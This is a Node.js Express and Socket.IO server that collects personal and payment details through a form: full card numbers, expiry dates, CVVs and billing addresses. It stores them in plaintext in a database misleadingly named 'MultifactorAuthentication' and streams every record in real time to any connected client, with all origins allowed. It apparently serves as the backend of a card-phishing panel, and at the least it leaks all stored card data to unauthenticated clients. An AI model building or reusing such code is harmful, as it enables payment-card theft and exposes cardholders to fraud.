const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const http = require('http'); // Required for using Socket.IO with Express
const { Server } = require('socket.io'); // Import Socket.IO
const { Schema } = mongoose;

// Create an Express app
const app = express();

// Middleware
app.use(cors({
  origin: '*', // Allow all origins
}));
app.use(bodyParser.json());


// MongoDB URI (replace with your actual MongoDB URI)
const dbURI = 'mongodb://localhost:27017/MultifactorAuthentication';

// MongoDB connection
mongoose.connect(dbURI)
  .then(() => console.log('Connected to MongoDB'))
  .catch((err) => console.log('Error connecting to MongoDB:', err));

// Define the schema for the form data
const formSchema = new Schema({
  firstName: String,
  lastName: String,
  email: String,
  phone: String,
  country: String,
  city: String,
  creditCardNumber: String,
  expiryDate: String,
  cvv: String,
  billingAddress: String,
});

// Create the model from the schema
const FormData = mongoose.model('FormData', formSchema);

// Create HTTP server using the Express app
const server = http.createServer(app);

// Initialize Socket.IO
const io = new Server(server, {
 
  cors: {
    origin:'*', // Specify allowed origins here
    methods: ['GET', 'POST'], // Specify allowed methods
    allowedHeaders: ['Content-Type'], // Specify allowed headers if needed
    credentials: true, // Allow credentials (cookies, authorization headers, etc.)
  },
});

// Handle Socket.IO connections
io.on('connection', (socket) => {
  console.log('A user connected via Socket.IO');

  // Send initial form data when a client connects
  socket.on('get-initial-data', 
    async () => {
    
    try {
      const forms = await FormData.find();
      socket.emit('initial-data', forms);
    } catch (error) {
      console.error('Error fetching initial data:', error);
    }
  },{  transports: ["websocket"]
  });

  // Handle client disconnections
  socket.on('disconnect', () => {
    console.log('A user disconnected from Socket.IO');
  });
});

// Route to handle form submission
app.post('/api/submit-form', async (req, res) => {
  const formData = req.body;

  try {
    // Save the data to MongoDB
    const newForm = new FormData(formData);
    await newForm.save();

    // Fetch all forms and emit updated data via Socket.IO
    const allForms = await FormData.find();
    io.emit('new-data', allForms); // Broadcast updated data to all clients

    res.status(200).json({ message: 'Form submitted successfully' });
  } catch (error) {
    console.error('Error saving form data:', error);
    res.status(500).json({ message: 'Error saving form data' });
  }
});

// Start the server
const PORT = process.env.PORT || 5002;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
